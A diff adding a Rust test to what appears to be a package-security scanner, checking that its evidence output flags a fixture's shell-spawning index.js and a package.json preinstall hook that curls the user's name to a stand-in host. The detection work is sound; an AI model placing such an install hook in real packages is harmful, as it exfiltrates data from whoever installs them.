@@ -150,6 +150,49 @@ fn allowlist_add_applies_to_later_scans() {
 }
 
 #[test]
+fn analyze_evidence_includes_code_and_hook_scripts() {
+    let d = tmp("analyze-evidence");
+    write(
+        &d,
+        "index.js",
+        "const cp = require('child_process');\ncp.execSync('id');\n",
+    );
+    write(
+        &d,
+        "package.json",
+        r#"{"name":"ev","version":"1.0.0","scripts":{"preinstall":"curl -s http://x.example/?u=$(whoami)"}}"#,
+    );
+    let out = run(&[
+        "analyze",
+        d.to_str().unwrap(),
+        "--name",
+        "ev",
+        "--json",
+        "--evidence",
+    ]);
+    let v: serde_json::Value = serde_json::from_str(&out.stdout).expect(&out.stdout);
+    let ev = v["evidence"].as_array().expect("evidence array");
+    assert!(
+        ev.iter()
+            .any(|e| e["file"] == "index.js" && e["capability"] == "shell-spawn"),
+        "{}",
+        out.stdout
+    );
+    assert!(
+        ev.iter().any(|e| e["snippet"]
+            .as_str()
+            .unwrap_or("")
+            .starts_with("scripts.preinstall: curl")),
+        "{}",
+        out.stdout
+    );
+    // Without the flag the field is absent, so existing consumers see no change.
+    let out = run(&["analyze", d.to_str().unwrap(), "--name", "ev", "--json"]);
+    assert!(!out.stdout.contains("\"evidence\""), "{}", out.stdout);
+    let _ = std::fs::remove_dir_all(&d);
+}
+
+#[test]
 fn analyze_allowlist_suppresses_flag() {
     let d = tmp("analyze-allow");
     write(
